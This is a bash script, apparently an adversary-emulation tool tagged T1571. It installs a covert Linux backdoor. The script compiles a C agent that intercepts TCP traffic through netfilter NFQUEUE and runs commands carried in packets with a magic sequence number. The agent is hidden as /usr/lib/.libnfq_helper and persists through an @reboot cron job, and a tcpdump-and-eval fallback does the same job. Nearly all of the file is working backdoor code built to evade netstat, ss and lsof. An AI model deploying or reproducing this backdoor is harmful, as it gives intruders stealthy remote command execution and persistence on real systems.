#!/bin/bash
# T1571 — Non-Standard Port: NFQUEUE Userspace Backdoor
# Intercept packets via netfilter queue — invisible to netstat/ss

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

MARKER="d3m0n_nfqueue"
WORKDIR="/tmp/.${MARKER}"

banner() {
    echo -e "${RED}"
    echo "  ╔═══════════════════════════════════════════════╗"
    echo "  ║   T1571 — NFQUEUE Userspace Backdoor          ║"
    echo "  ║   Invisible to netstat/ss — no open port      ║"
    echo "  ╚═══════════════════════════════════════════════╝"
    echo -e "${NC}"
}

deploy_nfqueue() {
    echo -e "${CYAN}[*] Deploying NFQUEUE backdoor${NC}"
    [[ $EUID -ne 0 ]] && { echo -e "${RED}[!] Root required (CAP_NET_ADMIN)${NC}"; return; }

    if ! command -v gcc &>/dev/null; then
        echo -e "${RED}[!] gcc required${NC}"; return
    fi

    echo -e "${YELLOW}[*] NFQUEUE redirects packets to userspace via iptables -j NFQUEUE."
    echo -e "    The backdoor intercepts traffic on a real port (e.g., 443) and"
    echo -e "    executes commands from packets with a magic TCP sequence number."
    echo -e "    No socket is bound → invisible to netstat, ss, lsof.${NC}"
    echo ""

    read -p "  Port to intercept (e.g., 443): " PORT
    [[ -z "$PORT" ]] && PORT="443"
    read -p "  Magic sequence number (hex, e.g., DEAD): " MAGIC_SEQ
    [[ -z "$MAGIC_SEQ" ]] && MAGIC_SEQ="DEAD"
    read -p "  Queue number (0-65535): " QNUM
    [[ -z "$QNUM" ]] && QNUM="7"

    mkdir -p "$WORKDIR"

    # Check for libnetfilter_queue
    if [[ ! -f /usr/include/libnetfilter_queue/libnetfilter_queue.h ]] && \
       ! pkg-config --exists libnetfilter_queue 2>/dev/null; then
        echo -e "${YELLOW}[!] libnetfilter-queue-dev not found, using iptables + ncat fallback${NC}"
        deploy_nfqueue_fallback "$PORT" "$MAGIC_SEQ"
        return
    fi

    cat > "${WORKDIR}/nfq.c" << CEOF
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <linux/netfilter.h>
#include <libnetfilter_queue/libnetfilter_queue.h>

#define MAGIC_SEQ 0x${MAGIC_SEQ}

static int cb(struct nfq_q_handle *qh, struct nfgenmsg *nfmsg,
              struct nfq_data *nfa, void *data) {
    unsigned char *payload;
    int len = nfq_get_payload(nfa, &payload);
    struct nfqnl_msg_packet_hdr *ph = nfq_get_msg_packet_hdr(nfa);
    uint32_t id = ntohl(ph->packet_id);

    if (len < (int)(sizeof(struct iphdr) + sizeof(struct tcphdr)))
        return nfq_set_verdict(qh, id, NF_ACCEPT, 0, NULL);

    struct iphdr *iph = (struct iphdr *)payload;
    if (iph->protocol != IPPROTO_TCP)
        return nfq_set_verdict(qh, id, NF_ACCEPT, 0, NULL);

    struct tcphdr *tcph = (struct tcphdr *)(payload + iph->ihl * 4);

    /* Check for magic sequence number */
    if ((ntohl(tcph->seq) & 0xFFFF) == MAGIC_SEQ) {
        int tcp_hdr_len = tcph->doff * 4;
        int data_off = iph->ihl * 4 + tcp_hdr_len;
        if (len > data_off) {
            char cmd[512] = {0};
            int cmd_len = len - data_off;
            if (cmd_len > 511) cmd_len = 511;
            memcpy(cmd, payload + data_off, cmd_len);
            /* Execute command silently */
            if (fork() == 0) {
                system(cmd);
                _exit(0);
            }
        }
        /* Drop the magic packet — never reaches application */
        return nfq_set_verdict(qh, id, NF_DROP, 0, NULL);
    }

    return nfq_set_verdict(qh, id, NF_ACCEPT, 0, NULL);
}

int main() {
    daemon(0, 0);
    struct nfq_handle *h = nfq_open();
    if (!h) return 1;
    nfq_unbind_pf(h, AF_INET);
    nfq_bind_pf(h, AF_INET);
    struct nfq_q_handle *qh = nfq_create_queue(h, ${QNUM}, &cb, NULL);
    nfq_set_mode(qh, NFQNL_COPY_PACKET, 0xffff);

    int fd = nfq_fd(h);
    char buf[4096];
    while (1) {
        int rv = recv(fd, buf, sizeof(buf), 0);
        if (rv >= 0) nfq_handle_packet(h, buf, rv);
    }
    return 0;
}
CEOF

    gcc -o "${WORKDIR}/nfq_agent" "${WORKDIR}/nfq.c" -lnetfilter_queue -lnfnetlink 2>/dev/null
    if [[ $? -ne 0 ]]; then
        echo -e "${RED}[!] Compilation failed — trying fallback${NC}"
        deploy_nfqueue_fallback "$PORT" "$MAGIC_SEQ"
        return
    fi

    cp "${WORKDIR}/nfq_agent" /usr/lib/.libnfq_helper
    chmod 755 /usr/lib/.libnfq_helper

    # Add iptables NFQUEUE rule
    iptables -I INPUT -p tcp --dport "$PORT" -j NFQUEUE --queue-num "$QNUM" 2>/dev/null

    # Run agent
    /usr/lib/.libnfq_helper &

    # Persistence
    cat > "/etc/cron.d/${MARKER}" << EOF
@reboot root iptables -I INPUT -p tcp --dport ${PORT} -j NFQUEUE --queue-num ${QNUM} 2>/dev/null; /usr/lib/.libnfq_helper &
EOF
    chmod 600 "/etc/cron.d/${MARKER}"

    echo -e "${GREEN}[+] NFQUEUE backdoor active on port ${PORT} (queue ${QNUM})${NC}"
    echo -e "${GREEN}[+] Magic trigger: TCP seq containing 0x${MAGIC_SEQ}${NC}"
    echo -e "${YELLOW}[*] Port ${PORT} still serves legitimate traffic normally${NC}"
    echo -e "${YELLOW}[*] Backdoor is INVISIBLE to netstat/ss/lsof${NC}"
}

deploy_nfqueue_fallback() {
    local PORT="$1" MAGIC="$2"
    echo -e "${CYAN}[*] Using iptables TEE + raw socket fallback${NC}"

    # Simpler approach: use iptables string match to trigger
    cat > "${WORKDIR}/nfq_simple.sh" << SEOF
#!/bin/bash
# ${MARKER} fallback — watch for magic in raw traffic
while true; do
    timeout 3600 tcpdump -l -i any "tcp port ${PORT}" -A 2>/dev/null | while read -r line; do
        if echo "\$line" | grep -q "${MAGIC}"; then
            CMD=\$(echo "\$line" | sed "s/.*${MAGIC}//")
            eval "\$CMD" &>/dev/null &
        fi
    done
    sleep 1
done
SEOF
    chmod 755 "${WORKDIR}/nfq_simple.sh"
    cp "${WORKDIR}/nfq_simple.sh" /usr/lib/.libnfq_helper
    nohup /usr/lib/.libnfq_helper &>/dev/null &

    echo -e "${GREEN}[+] Fallback NFQUEUE-style listener deployed${NC}"
}

cleanup() {
    echo -e "${CYAN}[*] Cleaning up NFQUEUE backdoor...${NC}"
    [[ $EUID -ne 0 ]] && { echo -e "${RED}[!] Root required${NC}"; return; }

    pkill -f "libnfq_helper" 2>/dev/null
    rm -f /usr/lib/.libnfq_helper
    rm -f "/etc/cron.d/${MARKER}"
    rm -rf "$WORKDIR"

    # Remove NFQUEUE rules
    iptables -S INPUT 2>/dev/null | grep "NFQUEUE" | while read -r rule; do
        iptables $(echo "$rule" | sed 's/-A/-D/') 2>/dev/null
    done

    echo -e "${GREEN}[+] NFQUEUE backdoor removed${NC}"
}

main() {
    banner

    echo -e "  ${CYAN}[1]${NC} Deploy NFQUEUE backdoor (invisible C2)"
    echo -e "  ${CYAN}[2]${NC} Cleanup"
    echo ""
    read -p "Choose [1-2]: " OPT

    case "$OPT" in
        1) deploy_nfqueue ;;
        2) cleanup ;;
        *) echo -e "${RED}[!] Invalid option${NC}" ;;
    esac
}

main
